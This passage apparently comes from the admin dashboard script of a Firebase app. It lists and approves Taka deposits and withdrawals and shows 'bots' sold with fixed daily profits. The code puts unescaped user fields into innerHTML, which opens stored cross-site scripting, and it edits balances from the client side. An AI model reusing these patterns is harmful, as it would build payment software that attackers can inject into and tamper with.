                body.innerHTML += `<tr><td>${d.username}</td><td>${d.amount} TK</td><td>${d.trxId}</td><td><button style="background:#10b981; color:#fff; border:none; padding:4px 8px; border-radius:4px; font-size:11px; cursor:pointer;" onclick="manageDeposit('${c.key}', 'accept')">Approve</button> <button style="background:#ef4444; color:#fff; border:none; padding:4px 8px; border-radius:4px; font-size:11px; cursor:pointer;" onclick="manageDeposit('${c.key}', 'reject')">Reject</button></td></tr>`;
            }
        });
        if(document.getElementById('stat-total-deposited')) document.getElementById('stat-total-deposited').innerText = totalDep.toFixed(2);
    });

    // পেন্ডিং উইথড্র তালিকা রেন্ডার (আপনার HTML-এর ৫টি কলাম স্ট্রাকচার অনুযায়ী)
    db.ref('withdraws').once('value', snap => {
        let body = document.getElementById('admin-withdraw-list'); if(body) body.innerHTML = '';
        let totalWit = 0;
        snap.forEach(c => {
            let w = c.val();
            if(w.status === 'accepted') totalWit += (parseFloat(w.reqAmount) || 0);
            if(w.status === 'pending' && body) {
                body.innerHTML += `<tr>
                    <td>${w.username}</td>
                    <td>${w.reqAmount} TK</td>
                    <td>${w.netPayable} TK</td>
                    <td style="color:#2dd4bf; font-weight:bold;">${w.phone}</td>
                    <td>
                        <button style="background:#10b981; color:#fff; border:none; padding:4px 6px; border-radius:4px; font-size:11px; cursor:pointer;" onclick="manageWithdraw('${c.key}', 'accept')">Approve</button> 
                        <button style="background:#ef4444; color:#fff; border:none; padding:4px 6px; border-radius:4px; font-size:11px; cursor:pointer;" onclick="manageWithdraw('${c.key}', 'reject')">Reject</button>
                    </td>
                </tr>`;
            }
        });
        if(document.getElementById('stat-total-withdrawn')) document.getElementById('stat-total-withdrawn').innerText = totalWit.toFixed(2);
    });

    // একটিভ বটের স্টোর লিস্ট (অ্যাডমিন ভিউ)
    db.ref('bots').once('value', snap => {
        let body = document.getElementById('admin-bots-list'); if(body) body.innerHTML = '';
        snap.forEach(c => {
            let b = c.val();
            if(body) body.innerHTML += `<tr><td>${b.name}</td><td>${b.price} TK</td><td>${b.profit} TK</td><td>${b.days} Days</td></tr>`;
        });
    });
}

// ৪. এডমিন নেট ক্যাশ হিসাব (ডিপোজিট - উইথড্র)
function calculateAdminNetCash() {
    db.ref('deposits').once('value', depSnap => {
        let depTotal = 0; depSnap.forEach(c => { if(c.val().status === 'accepted') depTotal += (parseFloat(c.val().amount) || 0); });
        db.ref('withdraws').once('value', witSnap => {
            let witTotal = 0; witSnap.forEach(c => { if(c.val().status === 'accepted') witTotal += (parseFloat(c.val().reqAmount) || 0); });
            let netCash = depTotal - witTotal;
            if(document.getElementById('stat-admin-cash')) document.getElementById('stat-admin-cash').innerText = netCash.toFixed(2);
        });
    });
}

// ৫. ডিপোজিট অনুমোদন অ্যাকশন
function manageDeposit(depKey, action) {
    db.ref('deposits/' + depKey).once('value', snapshot => {
        let req = snapshot.val();
        if(req && req.status === 'pending') {
            let statusValue = action === 'accept' ? 'accepted' : 'rejected';
            db.ref('deposits/' + depKey + '/status').set(statusValue).then(() => {
                if(action === 'accept') {
                    db.ref('users/' + req.username + '/balance').once('value', balSnap => {
                        let finalBal = parseFloat(((balSnap.val() || 0) + req.amount).toFixed(2));
                        db.ref('users/' + req.username + '/balance').set(finalBal).then(() => { alert("ডিপোজিট অ্যাপ্রুভড!"); loadAdminData(); });
                    });
                } else { alert("ডিপোজিট রিজেক্টেড।"); loadAdminData(); }
            });
        }
    });
}

// ৬. উইথড্র অনুমোদন অ্যাকশন
function manageWithdraw(witKey, action) {
    db.ref('withdraws/' + witKey).once('value', snapshot => {
        let req = snapshot.val();
        if(req && req.status === 'pending') {
            let statusValue = action === 'accept' ? 'accepted' : 'rejected';
            db.ref('withdraws/' + witKey + '/status').set(statusValue).then(() => {
                if(action === 'reject') {
                    db.ref('users/' + req.username + '/balance').once('value', balSnap => {
                        let finalBal = parseFloat(((balSnap.val() || 0) + req.reqAmount).toFixed(2));
                        db.ref('users/' + req.username + '/balance').set(finalBal).then(() => { alert("উইথড্র রিজেক্টেড! টাকা ইউজারের ওয়ালেটে ব্যাক দেওয়া হয়েছে।"); loadAdminData(); });
                    });
                } else { alert("উইথড্র সাকসেসফুলি অ্যাপ্রুভড!"); loadAdminData(); }
            });
        }
    });
}
